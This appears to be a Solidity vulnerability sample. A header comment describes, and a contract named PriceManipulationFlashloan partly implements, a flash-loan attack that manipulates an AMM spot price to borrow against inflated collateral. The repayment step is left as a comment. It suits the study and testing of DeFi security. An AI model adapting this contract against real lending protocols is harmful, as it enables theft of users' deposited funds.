// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * VULNERABILITY: Price Oracle Manipulation via Flash Loan
 * CATEGORY: Flash Loan — AMM Price Manipulation + Oracle Exploit
 *
 * Classic 2024-2025 exploit pattern:
 * 1. Flash borrow large amount of tokenA from Lender
 * 2. Dump tokenA into AMM pool → tokenA price crashes, tokenB price spikes
 * 3. Deposit tokenB as collateral to Lending protocol (price now inflated)
 * 4. Borrow maximum tokenA against inflated tokenB collateral
 * 5. Repay flash loan → keep profit (borrowed tokenA - flash loan fee)
 */
interface IAMM {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
    function getSpotPrice(address token) external view returns (uint256);
}

interface ILendingProtocol {
    function depositCollateral(address token, uint256 amount) external;
    function borrow(address token, uint256 amount) external;
}

contract PriceManipulationFlashloan {
    IAMM            public amm;
    ILendingProtocol public lending;

    constructor(address _amm, address _lending) {
        amm     = IAMM(_amm);
        lending = ILendingProtocol(_lending);
    }

    // Entry point: called by flash loan provider
    function onFlashLoan(uint256 flashAmount, address tokenA, address tokenB) external {
        // Step 2: Dump tokenA → inflates tokenB spot price in AMM
        uint256 tokenBReceived = amm.swap(tokenA, flashAmount);

        // Step 3 & 4: deposit tokenB at inflated price, borrow tokenA
        lending.depositCollateral(tokenB, tokenBReceived);
        uint256 borrowedA = (tokenBReceived * amm.getSpotPrice(tokenB) * 75) / (100 * 1e18);
        lending.borrow(tokenA, borrowedA);

        // Step 5: repay flash loan — profit = borrowedA - flashAmount - fee
        // (Repayment logic would transfer tokenA back to flash lender)
    }
}
